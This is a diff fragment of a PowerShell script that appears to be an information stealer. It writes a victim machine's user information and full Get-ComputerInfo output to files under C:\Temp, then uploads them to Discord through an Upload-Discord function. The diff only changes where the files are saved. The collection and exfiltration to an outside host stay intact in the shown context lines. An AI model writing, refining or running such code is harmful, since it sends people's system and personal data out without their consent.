@@ -28,9 +28,9 @@ $userInfo | Out-File -FilePath "C:\Temp\userInfo.txt" -Encoding utf8
 
 #2. Get Computer Informations
 #Create the file to store the info
-New-Item -Path "$Path\ComputerInfo.txt" -ItemType File
+New-Item -Path "C:\Temp\ComputerInfo.txt" -ItemType File
 #Get info and then store it to the file
-Get-ComputerInfo | Out-File -FilePath "$Path\ComputerInfo.txt"
+Get-ComputerInfo | Out-File -FilePath "C:\Temp\ComputerInfo.txt" -Encoding utf8
 
 #Upload files to Discord via the Upload-Discord function
 Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
